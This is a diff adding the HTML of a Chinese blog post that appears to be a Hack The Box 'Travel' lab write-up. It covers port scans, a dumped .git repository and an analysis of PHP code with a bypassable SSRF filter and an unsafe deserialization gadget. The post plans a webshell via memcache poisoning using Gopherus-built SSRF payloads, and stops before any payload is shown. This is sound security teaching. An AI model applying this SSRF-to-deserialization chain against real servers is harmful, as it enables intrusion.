@@ -1,0 +1,440 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(一四三)之HTBTravel | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="端口扫描┌──(mikannse㉿kali)-[~&#x2F;HTB&#x2F;travel]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.189                   Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-12 13:12 CSTNmap scan report for 10.10.10.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶记录(一四三)之HTBTravel">
+<meta property="og:url" content="http://mikannse.space/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%B8%89)%E4%B9%8BHTBTravel/index.html">
+<meta property="og:site_name" content="MikannseのSekai">
+<meta property="og:description" content="端口扫描┌──(mikannse㉿kali)-[~&#x2F;HTB&#x2F;travel]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.189                   Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-12 13:12 CSTNmap scan report for 10.10.10.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
+<meta property="article:published_time" content="2024-09-12T12:13:01.000Z">
+<meta property="article:modified_time" content="2024-09-12T12:14:53.854Z">
+<meta property="article:author" content="Mikannse">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="ldap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/09/12/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%9B%9B%E4%B8%89)%E4%B9%8BHTBTravel/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '打靶记录(一四三)之HTBTravel',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isToc: true,
+  postUpdate: '2024-09-12 20:14:53'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (true) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(一四三)之HTBTravel</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-12T12:13:01.000Z" title="发表于 2024-09-12 20:13:01">2024-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-12T12:14:53.854Z" title="更新于 2024-09-12 20:14:53">2024-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(一四三)之HTBTravel"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ sudo nmap --min-rate=10000 -p- 10.10.10.189                   </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 13:12 CST</span><br><span class="line">Nmap scan report for 10.10.10.189</span><br><span class="line">Host is up (0.067s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.52 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/HTB/travel]</span><br><span class="line">└─$ sudo nmap -sT -sC -sV -O -p22,80,443 10.10.10.189</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 13:13 CST</span><br><span class="line">Nmap scan report for 10.10.10.189</span><br><span class="line">Host is up (0.061s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 d3:9f:31:95:7e:5e:11:45:a2:b4:b6:34:c0:2d:2d:bc (RSA)</span><br><span class="line">|   256 ef:3f:44:21:46:8d:eb:6c:39:9c:78:4f:50:b3:f3:6b (ECDSA)</span><br><span class="line">|_  256 3a:01:bc:f8:57:f5:27:a1:68:1d:6a:3d:4e:bc:21:1b (ED25519)</span><br><span class="line">80/tcp  open  http     nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB</span><br><span class="line">|_http-server-header: nginx/1.17.6</span><br><span class="line">443/tcp open  ssl/http nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB - SSL coming soon.</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK</span><br><span class="line">| Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb</span><br><span class="line">| Not valid before: 2020-04-23T19:24:29</span><br><span class="line">|_Not valid after:  2030-04-21T19:24:29</span><br><span class="line">|_http-server-header: nginx/1.17.6</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 2.6.18 (97%), Linux 3.7 (96%), Linux 3.2.0 (96%), Tomato 1.27 - 1.28 (Linux 2.4.20) (96%), Tomato 1.28 (Linux 2.4.20) (95%), MikroTik RouterOS 6.15 (Linux 3.3.5) (94%), ZoneAlarm Z100G WAP (94%), HP Onboard Administrator 4.01 (93%), HP Onboard Administrator 4.12 - 4.40 (93%), Linux 2.6.32 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.29 seconds</span><br></pre></td></tr></tbody></table></figure>
+
+<p>添加hosts</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">10.10.10.189 www.travel.htb travel.htb blog.travel.htb blog-dev.travel.htb</span><br></pre></td></tr></tbody></table></figure>
+
+<p>网站有点多，一共是四个,https似乎尚未开通,blog-dev.travel.htb没有权限访问,blog.travel.htb是一个wordpress。存在一个admin用户,用rockyou跑了一下密码没结果</p>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>但是发现有一个git仓库暴露 <a target="_blank" rel="noopener" href="http://blog-dev.travel.htb/.git/">http://blog-dev.travel.htb/.git/</a> 。dump下来，有两个php文件</p>
+<p>template.php:</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> Todo: finish logging implementation via TemplateHelper</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">	<span class="comment">// this should be secure</span></span><br><span class="line">	<span class="variable">$tmpUrl</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$tmpUrl</span>, <span class="string">"file://"</span>) !== <span class="literal">false</span> <span class="keyword">or</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$tmpUrl</span>, <span class="string">"@"</span>) !== <span class="literal">false</span>)</span><br><span class="line">	{		</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h2&gt;Hacking attempt prevented (LFI). Event has been logged.&lt;/h2&gt;"</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$tmpUrl</span>, <span class="string">"-o"</span>) !== <span class="literal">false</span> <span class="keyword">or</span> <span class="title function_ invoke__">strpos</span>(<span class="variable">$tmpUrl</span>, <span class="string">"-F"</span>) !== <span class="literal">false</span>)</span><br><span class="line">	{		</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;"</span>);</span><br><span class="line">	}</span><br><span class="line">	<span class="variable">$tmp</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">	<span class="comment">// preventing all localhost access</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">"localhost"</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">"127.0.0.1"</span>)</span><br><span class="line">	{		</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;"</span>);		</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url_get_contents</span> (<span class="params"><span class="variable">$url</span></span>) </span>{</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">safe</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="variable">$url</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line">	<span class="variable">$pl</span> = <span class="string">"curl "</span>.<span class="variable">$url</span>;</span><br><span class="line">	<span class="variable">$output</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$pl</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">    	<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">init</span>(<span class="variable">$this</span>-&gt;file, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>{    	</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="keyword">__DIR__</span>.<span class="string">'/logs/'</span>.<span class="variable">$this</span>-&gt;file, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>有一个safe函数,会对url进行关键词筛选，防止SSRF。随后有一个TemplateHelper类，然后一些初始化的魔术方法,这里的wakeup方法在反序列化时被触发,并且init方法会将，data内容写到以file为文件名内，可以尝试写webshell</p>
+<p>rss-template.php</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">Template Name: Awesome RSS</span><br><span class="line">*/</span><br><span class="line">include('./template.php');</span><br><span class="line">get_header();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;main class="section-inner"&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    function get_feed($url)</span><br><span class="line">    {</span><br><span class="line">        require_once ABSPATH . '/wp-includes/class-simplepie.php';</span><br><span class="line">        $simplepie = null;</span><br><span class="line">        $data = url_get_contents($url);</span><br><span class="line">        if ($url) {</span><br><span class="line">            $simplepie = new SimplePie();</span><br><span class="line">            $simplepie-&gt;set_cache_location('memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_');</span><br><span class="line">            //$simplepie-&gt;set_raw_data($data);</span><br><span class="line">            $simplepie-&gt;set_feed_url($url);</span><br><span class="line">            $simplepie-&gt;init();</span><br><span class="line">            $simplepie-&gt;handle_content_type();</span><br><span class="line">            if ($simplepie-&gt;error) {</span><br><span class="line">                error_log($simplepie-&gt;error);</span><br><span class="line">                $simplepie = null;</span><br><span class="line">                $failed = True;</span><br><span class="line">            }</span><br><span class="line">        } else {</span><br><span class="line">            $failed = True;</span><br><span class="line">        }</span><br><span class="line">        return $simplepie;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $url = $_SERVER['QUERY_STRING'];</span><br><span class="line">    if (strpos($url, "custom_feed_url") !== false) {</span><br><span class="line">        $tmp = (explode("=", $url));</span><br><span class="line">        $url = end($tmp);</span><br><span class="line">    } else {</span><br><span class="line">        $url = "http://www.travel.htb/newsfeed/customfeed.xml";</span><br><span class="line">    }</span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">DEBUG</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET['debug'])) {</span><br><span class="line">    include('debug.php');</span><br><span class="line">}</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php get_template_part('template-parts/footer-menus-widgets'); ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">get_footer();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>RSS是一个用以聚合多个网站更新的内容到一个网站的功能,根据上述，网站所使用的是wordpress默认的simplepieRSS</p>
+<p>simplepie类可以找到:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://github.com/WordPress/WordPress/blob/master/wp-includes/class-simplepie.php</span><br></pre></td></tr></tbody></table></figure>
+
+<p>首先关注get_feed()函数,用于从给定的 URL 获取 RSS feed,还会进行缓存。随后，这个函数就被调用，首先会检测url请求中是否含有”custom_feed_url”参数,然后根据”=”将”=”前后的字符串分割成数组,取最后一个元素作为$url</p>
+<p>比如:</p>
+<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">'http://example.com/?custom_feed_url=xxx'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">"custom_feed_url"</span>) !== <span class="literal">false</span>) {</span><br><span class="line">    <span class="variable">$tmp</span> = (<span class="title function_ invoke__">explode</span>(<span class="string">"="</span>, <span class="variable">$url</span>));</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$tmp</span>);</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$tmp</span>);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">"http://www.travel.htb/newsfeed/customfeed.xml"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$url</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<p>输出的结果是:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">[Running] php <span class="string">"c:\Users\mikannse\Desktop\Untitled-1.php"</span></span><br><span class="line">array(2) {</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(35) <span class="string">"http://example.com/?custom_feed_url"</span></span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(3) <span class="string">"xxx"</span></span><br><span class="line">}</span><br><span class="line">xxx</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在结尾，会包含一个debug.php,能够传入debug参数,并且能在源码看到像是:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ curl -s <span class="string">'http://blog.travel.htb/awesome-rss/?debug'</span> |grep xct</span><br><span class="line">| xct_4e5612ba07(...) | a:4:{s:5:<span class="string">"child"</span>;a:1:{s:0:<span class="string">""</span>;a:1:{(...) |</span><br></pre></td></tr></tbody></table></figure>
+
+<p>看形式是memcache中的的序列化之后的字符串。那么思路也就是通过，前面是一串哈希，后面是一个序列化字符串</p>
+<h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>并且这个哈希实际上就是url进行md5哈希然后再次进行哈希。见memcache.php的源码</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">public <span class="keyword">function</span> __construct(<span class="variable">$location</span>, <span class="variable">$name</span>, <span class="variable">$type</span>) {</span><br><span class="line">    <span class="variable">$this</span>-&gt;options = array(</span><br><span class="line">        <span class="string">'host'</span>   =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'port'</span>   =&gt; 11211,</span><br><span class="line">        <span class="string">'extras'</span> =&gt; array(</span><br><span class="line">            <span class="string">'timeout'</span> =&gt; 3600, // one hour</span><br><span class="line">            <span class="string">'prefix'</span>  =&gt; <span class="string">'simplepie_'</span>,</span><br><span class="line">        ),</span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$this</span>-&gt;options = SimplePie_Misc::array_merge_recursive(<span class="variable">$this</span>-&gt;options, SimplePie_Cache::parse_URL(<span class="variable">$location</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;name = <span class="variable">$this</span>-&gt;options[<span class="string">'extras'</span>][<span class="string">'prefix'</span>] . md5(<span class="string">"<span class="variable">$name</span>:<span class="variable">$type</span>"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$this</span>-&gt;cache = new Memcached();</span><br><span class="line">    <span class="variable">$this</span>-&gt;cache-&gt;addServer(<span class="variable">$this</span>-&gt;options[<span class="string">'host'</span>], (int)<span class="variable">$this</span>-&gt;options[<span class="string">'port'</span>]);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>那么现在的思路就是通过写入一个序列化字符串到memcache中，然后进行反序列化。但是后面那串序列化不是我们能够控制的，为了直接与memcache://127.0.0.1:11211进行通信，需要配合SSRF</p>
+<p>一个很好能帮助ssrfpayload的是: <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> ,并且还有带有phpmemcache的利用，只需要输入payload就能生成SSRF的payload</p>
